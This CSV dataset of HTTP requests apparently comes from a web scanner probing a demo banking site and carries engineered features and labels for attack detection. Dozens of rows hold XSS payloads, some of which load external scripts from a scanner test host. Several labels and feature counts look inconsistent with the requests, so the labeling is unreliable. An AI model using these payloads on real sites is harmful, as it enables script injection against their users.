method,path,body,single_q,double_q,dashes,braces,spaces,url_length,body_length,base64_count,path_entropy,body_entropy,header_count,sql_injection_count,xss_attack_count,command_injection_count,directory_traversal_count,csrf_count,label
GET,/index.jsp?content=inside_contact.htm,0,0,0,0,0,0,37,1,0,3.980157597,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal.htm,0,0,0,0,0,0,31,1,0,4.131300343,0,13,0,0,0,0,1,1
GET,/index.jsp?content=business.htm,0,0,0,0,0,0,31,1,0,4.002268084,0,13,0,0,0,0,1,1
GET,/index.jsp?content=inside.htm,0,0,0,0,0,0,29,1,0,3.88333746,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal_loans.htm,0,0,0,0,0,0,37,1,0,4.16542119,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal_deposit.htm,0,0,0,0,0,0,39,1,0,4.150410873,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal_checking.htm,0,0,0,0,0,0,40,1,0,4.293942708,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal_cards.htm,0,0,0,0,0,0,37,1,0,4.229327352,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal_investments.htm,0,0,0,0,0,0,43,1,0,4.106984384,0,13,0,0,0,0,1,1
GET,/index.jsp?content=business_lending.htm,0,0,0,0,0,0,39,1,0,4.131054783,0,13,0,0,0,0,1,1
GET,/index.jsp?content=personal_other.htm,0,0,0,0,0,0,37,1,0,4.162023974,0,13,0,0,0,0,1,1
GET,/index.jsp?content=business_deposit.htm,0,0,0,0,0,0,39,1,0,4.045286117,0,13,0,0,0,0,1,1
GET,/index.jsp?content=business_cards.htm,0,0,0,0,0,0,37,1,0,4.20622592,0,13,0,0,0,0,1,1
GET,/index.jsp?content=business_insurance.htm,0,0,0,0,0,0,41,1,0,4.1226937,0,13,0,0,1,0,1,1
GET,/index.jsp?content=business_retirement.htm,0,0,0,0,0,0,42,1,0,4.023652102,0,13,0,0,0,0,1,1
GET,/subscribe.jsp,0,0,0,0,0,0,14,1,0,3.324862958,0,13,0,0,0,0,1,1
GET,/images/,0,0,0,0,0,0,8,1,0,2.75,0,12,0,0,0,0,0,0
GET,/swagger/,0,0,0,0,0,0,9,1,0,2.725480557,0,12,0,0,0,0,0,0
GET,/default.jsp?content=security.htm,0,0,0,0,0,0,33,1,0,4.245469029,0,13,0,0,0,0,1,1
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,13,0,0,0,0,1,1
GET,/swagger/index.html,0,0,0,0,0,0,19,1,0,3.93213804,0,13,0,0,0,0,1,1
GET,/default.jsp,0,0,0,0,0,0,12,1,0,3.584962501,0,13,0,0,0,0,1,1
GET,/status_check.jsp,0,0,0,0,0,0,17,1,0,3.572469459,0,13,0,0,0,0,1,1
POST,/doLogin,"uid=&passw=&btnSubmit=Login",0,0,0,0,0,8,28,0,2.75,4.039148672,15,1,0,0,0,1,1
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,13,0,0,0,0,1,1
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,13,0,0,0,0,1,1
GET,/disclaimer.htm?url=http://www.netscape.com,0,0,0,0,0,0,43,1,0,4.251164173,0,13,0,0,0,0,1,1
GET,/sitemap.xml.gz,0,0,0,0,0,0,15,1,0,3.640223929,0,11,0,0,0,0,0,0
GET,/subscribe.swf,0,0,0,0,0,0,14,1,0,3.324862958,0,13,0,0,0,0,1,1
GET,/retirement.htm,0,0,0,0,0,0,15,1,0,3.006238929,0,13,0,0,0,0,1,1
GET,/high_yield_investments.htm,0,0,0,0,0,0,27,1,0,3.754163428,0,13,0,0,0,0,1,1
GET,/disclaimer.htm?url=http://www.microsoft.com,0,0,0,0,0,0,44,1,0,4.202972243,0,13,0,0,0,0,1,1
GET,/admin/,0,0,0,0,0,0,7,1,0,2.521640636,0,12,0,0,0,0,0,0
GET,/my documents/JohnSmith/Bank Site Documents/grouplife.htm,0,0,0,0,0,3,57,1,0,4.425191225,0,13,0,0,0,0,1,1
POST,/doSubscribe,"txtEmail=&btnSubmit=Subscribe",0,0,0,0,0,12,30,0,3.418295834,3.948394346,15,0,0,0,0,1,1
GET,/my documents/,0,0,0,0,0,1,14,1,0,3.521640636,0,12,0,0,0,0,0,0
GET,/my documents/JohnSmith/Bank Site Documents/,0,0,0,0,0,3,44,1,0,4.135234743,0,12,0,0,0,0,0,0
GET,/my documents/JohnSmith/,0,0,0,0,0,1,24,1,0,3.855388542,0,12,0,0,0,0,0,0
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,13,0,0,0,0,1,1
GET,/pr/,0,0,0,0,0,0,4,1,0,1.5,0,12,0,0,0,0,0,0
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,13,0,0,0,0,1,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=&subject=&comments=&submit=Submit",0,0,0,0,0,13,78,0,3.180832987,4.24053099,15,0,0,0,0,1,1
GET,/swagger/swagger-ui-bundle.js,0,0,0,0,0,0,29,1,0,3.840402547,0,13,0,0,0,0,1,1
GET,/swagger/swagger-ui-standalone-preset.js,0,0,0,0,0,0,40,1,0,3.903701696,0,13,2,0,0,0,1,1
GET,/survey_questions.jsp?step=a,0,0,0,0,0,0,28,1,0,4.00862178,0,13,0,0,0,0,1,1
GET,/connecttest.txt,0,0,0,0,0,0,16,1,0,2.89939747,0,3,0,0,0,0,0,0
GET,/connecttest.txt,0,0,0,0,0,0,16,1,0,2.89939747,0,3,0,0,0,0,0,0
GET,/connecttest.txt,0,0,0,0,0,0,16,1,0,2.89939747,0,3,0,0,0,0,0,0
GET,/connecttest.txt,0,0,0,0,0,0,16,1,0,2.89939747,0,3,0,0,0,0,0,0
GET,/survey_questions.jsp?step=b,0,0,0,0,0,0,28,1,0,4.00862178,0,13,0,0,0,0,1,1
GET,/subscribe.aspx,0,0,0,0,0,0,15,1,0,3.456564762,0,13,0,0,0,0,1,1
GET,/security.htm,0,0,0,0,0,0,13,1,0,3.546593564,0,13,0,0,0,0,1,1
GET,/urchin.js,0,0,0,0,0,0,10,1,0,3.321928095,0,12,0,0,0,0,1,1
GET,/search.jsp,0,0,0,0,0,0,11,1,0,3.277613437,0,10,0,0,0,0,1,1
GET,/search.jsp,0,0,0,0,0,0,11,1,0,3.277613437,0,9,0,0,0,0,0,0
GET,/search.jsp?query=acu77190883f48f1740f117883653779aec,0,0,0,0,0,0,53,1,0,4.390300587,0,9,0,0,0,0,0,0
GET,/search.jsp?query=<script>alert(456735942253)</script>,0,0,0,0,1,0,54,1,0,4.655182354,0,9,0,7,0,0,0,1
GET,"/search.jsp?query=>'><ScRiPt 
>alert(456755942254);</ScRiPt>",0,1,0,0,1,1,61,1,0,4.983615411,0,9,0,8,0,0,0,1
GET,"/search.jsp?query=--><ScRiPt 
>alert(456795942254);</ScRiPt>",0,0,0,1,1,1,61,1,0,5.024438772,0,9,0,7,0,0,0,1
GET,"/search.jsp?query=</textarea><ScRiPt 
>alert(456775942254);</ScRiPt>",0,0,0,0,1,1,69,1,0,4.923762052,0,9,0,8,0,0,0,1
GET,"/search.jsp?query=<ScRiPt 
>alert(456745942254);</ScRiPt>",0,0,0,0,1,1,58,1,0,4.965318279,0,9,0,6,0,0,0,1
GET,"/search.jsp?query=>""><ScRiPt 
>alert(456765942254);</ScRiPt>",0,0,1,0,1,1,61,1,0,5.004027091,0,9,0,8,0,0,0,1
GET,"/search.jsp?query=</title><ScRiPt 
>alert(456785942254);</ScRiPt>",0,0,0,0,1,1,66,1,0,4.958807142,0,9,0,8,0,0,0,1
GET,"/search.jsp?query=email@some<ScRiPt 
>alert(456805942254);</ScRiPt>domain.com",0,0,0,0,1,1,78,1,0,5.129774456,0,9,0,6,0,0,0,1
GET,/search.jsp?query=[img]JaVaScRiPt:alert(456815942254)[/img],0,0,0,0,1,0,59,1,0,5.039008515,0,9,0,2,0,0,0,1
GET,"/search.jsp?query=<img src=""JaVaS&#99;RiPt:alert(456825942254);"">",0,0,2,0,1,1,65,1,0,5.15268589,0,9,0,4,0,0,0,1
GET,/search.jsp,0,0,0,0,0,0,11,1,0,3.277613437,0,9,0,0,0,0,0,0
GET,/search.jsp,0,0,0,0,0,0,11,1,0,3.277613437,0,10,0,0,0,0,0,0
GET,/search.jsp,0,0,0,0,0,0,11,1,0,3.277613437,0,10,0,0,0,0,0,0
GET,/search.jsp,0,0,0,0,0,0,11,1,0,3.277613437,0,10,0,0,0,0,0,0
GET,"/search.jsp?query=<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo="" invalid=""456935943822"">",0,0,4,0,0,2,138,1,0,5.651764903,0,9,1,4,0,0,0,1
GET,/search.jsp?query=<body onload=alert(456955943822)>,0,0,0,0,1,1,51,1,0,4.89253441,0,9,0,3,0,0,0,1
GET,"/search.jsp?query=<DIV STYLE=""width:expression(alert(456895943821));"">",0,0,2,0,2,1,70,1,0,5.36343101,0,9,0,3,0,0,0,1
GET,"/search.jsp?query=<img dynsrc=""JaVaScRiPt:alert(456915943821);"">",0,0,2,0,1,1,64,1,0,5.245864648,0,9,0,4,0,0,0,1
GET,/search.jsp?query=<ScRiPt src=http://testphp.acunetix.com/xss.js?456965943822></ScRiPt>,0,0,0,0,0,1,87,1,0,4.871828014,0,9,0,5,0,0,0,1
GET,"/search.jsp?query=<embed src=""http://testphp.acunetix.com/xss.swf?456945943822"" type=""application/x-shockwave-flash""/>",0,0,4,0,0,2,118,1,0,5.013994029,0,9,0,2,0,0,0,1
GET,/search.jsp?query=<script>alert(456875943821);</script>,0,0,0,0,1,0,56,1,0,4.831833663,0,9,0,6,0,0,0,1
GET,"/search.jsp?query=<FRAMESET><FRAME SRC=""JaVaS&#99;RiPt:alert(456905943821);""></FRAMESET>",0,0,2,0,1,1,88,1,0,5.340073738,0,9,2,7,0,0,0,1
GET,/search.jsp?query=<scrip<script>t>alert(456885943821);</scrip</script>t>,0,0,0,0,1,0,72,1,0,4.583052177,0,9,0,11,0,0,0,1
GET,"/search.jsp?query=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=JaVaS&#99;RiPt:alert(456925943822);"">",0,0,4,0,1,2,97,1,0,5.468483915,0,9,0,3,0,0,0,1
GET,/search.jsp?query=<img src=http://testphp.acunetix.com/dot.gif onload=alert(456985943899)>,0,0,0,0,1,2,90,1,0,4.963788791,0,9,0,4,0,0,0,1
GET,"/search.jsp?query=<ScRiPt bad="">"" src=""http://testphp.acunetix.com/xss.js?457015943899""></ScRiPt>",0,0,4,0,0,2,97,1,0,5.01530875,0,9,0,6,0,0,0,1
GET,"/search.jsp?query="" onmouseover=alert(457025943899) ",0,0,1,0,1,2,52,1,0,4.818241584,0,9,0,1,0,0,0,1
GET,/search.jsp?query=%3CScRiPt%3Ealert(457005943899);%3C/ScRiPt%3E,0,0,0,0,1,0,63,1,0,4.907691384,0,9,0,1,0,0,0,1
GET,/search.jsp?query=<script/xss src=http://testphp.acunetix.com/xss.js?456975943898></script>,0,0,0,0,0,1,91,1,0,4.630171038,0,9,0,5,0,0,0,1
GET,/search.jsp?query=' style='background:url(JaVaScRiPt:alert(456995943899))' invalidparam=',0,4,0,0,2,2,89,1,0,5.08642174,0,9,0,2,0,0,0,1
GET,"/search.jsp?query='""><ScRiPt 
>alert(457055943899);</ScRiPt>",0,1,1,0,1,1,62,1,0,5.127031592,0,9,0,7,0,0,0,1
GET,"/search.jsp?query=<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html;charset=UTF-7""></HEAD>+ADw-ScRiPt+AD4-alert(457045943899)+ADsAPA-/ScRiPt+AD4-",0,0,4,0,1,2,152,1,0,5.413183271,0,9,2,7,0,0,0,1
GET,"/search.jsp?query=</div><ScRiPt 
>alert(457035943899);</ScRiPt>",0,0,0,0,1,1,64,1,0,5.081343945,0,9,0,8,0,0,0,1
GET,"/search.jsp?query=""'><ScRiPt 
>alert(457065943899);</ScRiPt>",0,1,1,0,1,1,62,1,0,5.171465262,0,9,0,7,0,0,0,1
GET,/search.jsp?query=Pic PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=,0,0,0,0,0,1,70,1,0,5.300153017,0,9,0,0,0,0,0,0
GET,/search.jsp?query=PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=,0,0,0,0,0,0,66,1,0,5.237057566,0,9,0,0,0,0,0,0
GET,/search.jsp?query=PiI PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=,0,0,0,0,0,1,70,1,0,5.339508552,0,9,0,0,0,0,0,0
GET,/search.jsp?query=%uff1e%uff07%uff1exxx%uff1cscript%uff1ealert(457135944214);%uff1c/script%uff1e,0,0,0,0,1,0,96,1,0,4.459026237,0,9,0,1,0,0,0,1
GET,/search.jsp?query=%uff1e%uff02%uff1exxx%uff1cscript%uff1ealert(457125944214);%uff1c/script%uff1e,0,0,0,0,1,0,96,1,0,4.430329493,0,9,0,1,0,0,0,1
GET,/search.jsp?query=</xss/*-*/style=xss:e/**/xpression(alert(457145944214))>,0,0,0,0,2,0,74,1,0,4.697110082,0,9,0,3,0,0,0,1
GET,"/search.jsp?query=ACUstart457115944214'"";ACUend",0,1,1,0,0,0,47,1,0,4.72438566,0,9,0,0,0,0,0,0
GET,/search.jsp?query=IiBvbm1vdXNlb3Zlcj0iYWxlcnQoJ3hzcy10ZXN0Jyk=,0,0,0,0,0,0,62,1,0,5.111217883,0,9,0,0,0,0,0,0
GET,/search.jsp?query=javascript:alert(457155944214),0,0,0,0,1,0,48,1,0,4.579448699,0,9,0,2,0,0,0,1
GET,/search.jsp?query=;acunetix:expr/**/ession(alert(457165944214));,0,0,0,0,2,0,64,1,0,4.827819531,0,9,0,1,0,0,0,1
GET,/search.jsp?query=<iframe/ /onload=alert(457175944665)></iframe>,0,0,0,0,1,1,64,1,0,4.838457868,0,9,0,5,0,0,0,1
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,10,0,0,0,0,1,1
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/index.jsp?content=acuaf37ddfc7bf210a39ed29e09521ce9b7,0,0,0,0,0,0,54,1,0,4.469997169,0,9,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/index.jsp?content=<script>alert(457225944779)</script>,0,0,0,0,1,0,55,1,0,4.574021023,0,9,0,7,0,0,0,1
GET,"/index.jsp?content=<ScRiPt 
>alert(457235944779);</ScRiPt>",0,0,0,0,1,1,59,1,0,4.93113516,0,9,0,6,0,0,0,1
GET,"/index.jsp?content=>""><ScRiPt 
>alert(457255944779);</ScRiPt>",0,0,1,0,1,1,62,1,0,4.907521262,0,9,0,8,0,0,0,1
GET,/index.jsp?content=[img]JaVaScRiPt:alert(457305944780)[/img],0,0,0,0,1,0,60,1,0,5.023231429,0,9,0,2,0,0,0,1
GET,"/index.jsp?content=--><ScRiPt 
>alert(457285944780);</ScRiPt>",0,0,0,1,1,1,62,1,0,5.016471061,0,9,0,7,0,0,0,1
GET,"/index.jsp?content=</textarea><ScRiPt 
>alert(457265944780);</ScRiPt>",0,0,0,0,1,1,70,1,0,4.939279803,0,9,0,8,0,0,0,1
GET,"/index.jsp?content=</title><ScRiPt 
>alert(457275944780);</ScRiPt>",0,0,0,0,1,1,67,1,0,4.88794446,0,9,0,8,0,0,0,1
GET,"/index.jsp?content=email@some<ScRiPt 
>alert(457295944780);</ScRiPt>domain.com",0,0,0,0,1,1,79,1,0,5.008354211,0,9,0,6,0,0,0,1
GET,"/index.jsp?content=>'><ScRiPt 
>alert(457245944779);</ScRiPt>",0,1,0,0,1,1,62,1,0,4.899614407,0,9,0,8,0,0,0,1
GET,"/index.jsp?content=<img src=""JaVaS&#99;RiPt:alert(457315944780);"">",0,0,2,0,1,1,66,1,0,5.248495256,0,9,0,4,0,0,0,1
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,10,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,10,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,10,0,0,0,0,0,0
GET,"/index.jsp?content=<embed src=""http://testphp.acunetix.com/xss.swf?457425945105"" type=""application/x-shockwave-flash""/>",0,0,4,0,0,2,119,1,0,4.945831079,0,9,0,2,0,0,0,1
GET,/index.jsp?content=<ScRiPt src=http://testphp.acunetix.com/xss.js?457445945105></ScRiPt>,0,0,0,0,0,1,88,1,0,4.733142948,0,9,0,5,0,0,0,1
GET,"/index.jsp?content=<img dynsrc=""JaVaScRiPt:alert(457395945105);"">",0,0,2,0,1,1,65,1,0,5.145143967,0,9,0,4,0,0,0,1
GET,"/index.jsp?content=<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo="" invalid=""457415945105"">",0,0,4,0,0,2,139,1,0,5.56728089,0,9,1,4,0,0,0,1
GET,/index.jsp?content=<script>alert(457355945105);</script>,0,0,0,0,1,0,57,1,0,4.701249778,0,9,0,6,0,0,0,1
GET,"/index.jsp?content=<DIV STYLE=""width:expression(alert(457375945105));"">",0,0,2,0,2,1,71,1,0,5.20440324,0,9,0,3,0,0,0,1
GET,"/index.jsp?content=<FRAMESET><FRAME SRC=""JaVaS&#99;RiPt:alert(457385945105);""></FRAMESET>",0,0,2,0,1,1,89,1,0,5.307045021,0,9,2,7,0,0,0,1
GET,"/index.jsp?content=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=JaVaS&#99;RiPt:alert(457405945105);"">",0,0,4,0,1,2,98,1,0,5.487123176,0,9,0,3,0,0,0,1
GET,/index.jsp?content=<scrip<script>t>alert(457365945105);</scrip</script>t>,0,0,0,0,1,0,73,1,0,4.573874568,0,9,0,11,0,0,0,1
GET,/index.jsp?content=<body onload=alert(457435945105)>,0,0,0,0,1,1,52,1,0,4.757756064,0,9,0,3,0,0,0,1
GET,/index.jsp?content=' style='background:url(JaVaScRiPt:alert(457475945407))' invalidparam=',0,4,0,0,2,2,90,1,0,5.040239731,0,9,0,2,0,0,0,1
GET,"/index.jsp?content='""><ScRiPt 
>alert(457535945408);</ScRiPt>",0,1,1,0,1,1,63,1,0,5.054439201,0,9,0,7,0,0,0,1
GET,/index.jsp?content=<img src=http://testphp.acunetix.com/dot.gif onload=alert(457465945407)>,0,0,0,0,1,2,91,1,0,4.846995916,0,9,0,4,0,0,0,1
GET,"/index.jsp?content=</div><ScRiPt 
>alert(457515945408);</ScRiPt>",0,0,0,0,1,1,65,1,0,4.962462382,0,9,0,8,0,0,0,1
GET,"/index.jsp?content="" onmouseover=alert(457505945408) ",0,0,1,0,1,2,53,1,0,4.687931483,0,9,0,1,0,0,0,1
GET,"/index.jsp?content=<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html;charset=UTF-7""></HEAD>+ADw-ScRiPt+AD4-alert(457525945408)+ADsAPA-/ScRiPt+AD4-",0,0,4,0,1,2,153,1,0,5.402754082,0,9,2,7,0,0,0,1
GET,/index.jsp?content=%3CScRiPt%3Ealert(457485945407);%3C/ScRiPt%3E,0,0,0,0,1,0,64,1,0,4.853373781,0,9,0,1,0,0,0,1
GET,"/index.jsp?content=""'><ScRiPt 
>alert(457545945408);</ScRiPt>",0,1,1,0,1,1,63,1,0,5.002929479,0,9,0,7,0,0,0,1
GET,/index.jsp?content=<script/xss src=http://testphp.acunetix.com/xss.js?457455945407></script>,0,0,0,0,0,1,92,1,0,4.512335668,0,9,0,5,0,0,0,1
GET,"/index.jsp?content=<ScRiPt bad="">"" src=""http://testphp.acunetix.com/xss.js?457495945407""></ScRiPt>",0,0,4,0,0,2,98,1,0,4.857790808,0,9,0,6,0,0,0,1
GET,/index.jsp?content=IiBvbm1vdXNlb3Zlcj0iYWxlcnQoJ3hzcy10ZXN0Jyk=,0,0,0,0,0,0,63,1,0,4.988951947,0,9,0,0,0,0,0,0
GET,/index.jsp?content=%uff1e%uff02%uff1exxx%uff1cscript%uff1ealert(457605946178);%uff1c/script%uff1e,0,0,0,0,1,0,97,1,0,4.549370314,0,9,0,1,0,0,0,1
GET,/index.jsp?content=Pic PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=,0,0,0,0,0,1,71,1,0,5.218212394,0,9,0,0,0,0,0,0
GET,/index.jsp?content=;acunetix:expr/**/ession(alert(457645946179));,0,0,0,0,2,0,65,1,0,4.716308536,0,9,0,1,0,0,0,1
GET,/index.jsp?content=%uff1e%uff07%uff1exxx%uff1cscript%uff1ealert(457615946178);%uff1c/script%uff1e,0,0,0,0,1,0,97,1,0,4.496757912,0,9,0,1,0,0,0,1
GET,"/index.jsp?content=ACUstart457595946178'"";ACUend",0,1,1,0,0,0,48,1,0,4.720175521,0,9,0,0,0,0,0,0
GET,/index.jsp?content=PiI PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=,0,0,0,0,0,1,71,1,0,5.257013627,0,9,0,0,0,0,0,0
GET,/index.jsp?content=PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=,0,0,0,0,0,0,67,1,0,5.179759668,0,9,0,0,0,0,0,0
GET,/index.jsp?content=</xss/*-*/style=xss:e/**/xpression(alert(457625946179))>,0,0,0,0,2,0,75,1,0,4.721891357,0,9,0,3,0,0,0,1
GET,/index.jsp?content=javascript:alert(457635946179),0,0,0,0,1,0,49,1,0,4.711349385,0,9,0,2,0,0,0,1
GET,/index.jsp?content=<iframe/ /onload=alert(457655946937)></iframe>,0,0,0,0,1,1,65,1,0,4.770305075,0,9,0,5,0,0,0,1
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,10,0,0,0,0,1,1
GET,/survey_questions.jsp?step=acub16a5b7255967cea83fe99358ac45756,0,0,0,0,0,0,62,1,0,4.655752867,0,9,0,0,0,0,0,0
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,9,0,0,0,0,0,0
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,9,0,0,0,0,0,0
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,10,0,0,0,0,0,0
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,10,0,0,0,0,0,0
GET,/survey_questions.jsp,0,0,0,0,0,0,21,1,0,3.820888851,0,10,0,0,0,0,0,0
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,9,0,0,0,0,0,0
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,10,0,0,0,0,1,1
GET,/disclaimer.htm?url=acu101460c67d1319c2e5192b3e7e228aef,0,0,0,0,0,0,55,1,0,4.581829378,0,9,0,0,0,0,0,0
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,9,0,0,0,0,0,0
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,10,0,0,0,0,0,0
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,10,0,0,0,0,0,0
GET,/disclaimer.htm,0,0,0,0,0,0,15,1,0,3.640223929,0,10,0,0,0,0,0,0
POST,/doLogin,"uid=acu8583c3d1359dfae927ce23272fb51bf9&passw=111-222-1933email@address.tst&btnSubmit=Login",0,0,0,0,0,8,92,0,2.75,4.770579419,11,1,0,0,0,0,1
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,10,0,0,0,0,1,1
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,9,0,0,0,0,0,0
POST,/doLogin,"uid=111-222-1933email@address.tst&passw=111-222-1933email@address.tst&btnSubmit=acu674f7f3870ae9de446dd60cf9788f114",0,0,0,0,0,8,116,0,2.75,4.730531268,11,1,0,0,0,0,1
POST,/doLogin,"uid=111-222-1933email@address.tst&passw=acu71d33caa7ad6aaeb3417d9259728adb4&btnSubmit=Login",0,0,0,0,0,8,92,0,2.75,4.716724871,11,1,0,0,0,0,1
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/login.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/login.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,9,0,0,0,0,0,0
GET,/login.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,10,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,10,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/doLogin,0,0,0,0,0,0,8,1,0,2.75,0,10,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
